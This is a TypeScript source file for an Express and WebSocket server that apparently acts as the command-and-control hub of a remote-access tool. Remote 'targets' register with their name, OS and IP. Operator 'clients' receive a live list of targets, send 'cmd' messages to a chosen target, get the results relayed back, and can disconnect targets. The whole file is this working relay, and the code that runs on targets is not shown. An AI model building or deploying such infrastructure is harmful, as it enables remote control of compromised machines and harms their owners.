if (process.env.NODE_ENV !== 'production') require('dotenv').config();

import express from 'express';
import cors from 'cors';

import path from 'path';
import fs from 'fs';

import { Server } from 'ws';
import { Socket, Command } from './structures/socket';
import { ITarget, Target } from './structures/target';

const app = express().use(cors()).use(express.json());

fs.readdirSync(path.join(__dirname, 'api', 'routes')).forEach((file) => {
  const name = file.split('.')[0];
  const router = require(`./api/routes/${name}`).router;
  app.use(`/api/${name}`, router);
});

app.use(
  '/',
  express.static(path.join('client', 'public'), {
    extensions: ['html'],
    redirect: false,
  })
);
app.get('*', (_req, res) =>
  res.sendFile(path.resolve('client/public/index.html'))
);

const port = process.env.PORT || 5000;
const server = app.listen(port, () =>
  console.log(`Server running on port ${port}.`)
);

const wss = new Server({ server });

export const targets: Target[] = [];
export const clients: Socket[] = [];

export const broadcast = (command: Command) =>
  clients.forEach((client) => client.send(command.name, command.data, '-1'));

wss.on('connection', (ws) => {
  ws.on('message', (msg) => {
    let command: Command;
    try {
      command = JSON.parse(msg.toString());
    } catch (err) {
      ws.close();
    }

    if (command.name !== 'greet') return;
    if (command.data?.t === 'client') {
      const client = new Socket(ws);

      clients.push(client);

      ws.on('message', (rawData) => {
        let data: Command;
        try {
          data = JSON.parse(rawData.toString());
        } catch (err) {
          return;
        }
        if (!['cmd', 'targetKick'].includes(data.name)) return;

        const target = targets.find((t) => t.id === data.to);
        if (!target) return;

        if (data.name === 'targetKick') return target.socket.close();

        target.send(data.name, data.data, client.id);
      });
      ws.on('close', () => clients.splice(clients.indexOf(client), 1));

      console.log(`New client: ${client.id}`);
    } else if (command.data?.t === 'other') {
      const target = new Target(ws, {
        name: command.data?.name,
        os: command.data?.os,
        ip: command.data?.ip,
      });

      broadcast({
        name: 'targetAdd',
        data: { ...target.toJSON(), os: undefined, up: undefined } as ITarget,
        from: '-1',
        to: '-1',
      });
      targets.push(target);

      ws.on('message', (rawData) => {
        let data: Command;

        try {
          data = JSON.parse(rawData.toString());
        } catch (err) {
          return;
        }
        if (data.name !== 'cmd') return;

        const client = clients.find((c) => c.id === data.from);
        if (!client) return;

        client.send(data.name, data.data, target.id);
      });
      ws.on('close', () => {
        broadcast({
          name: 'targetQuit',
          data: { id: target.id },
          from: '-1',
          to: '-1',
        });
        targets.splice(targets.indexOf(target), 1);
      });

      console.log(`New target: ${target.id}`);
    } else return ws.close();
  });
});
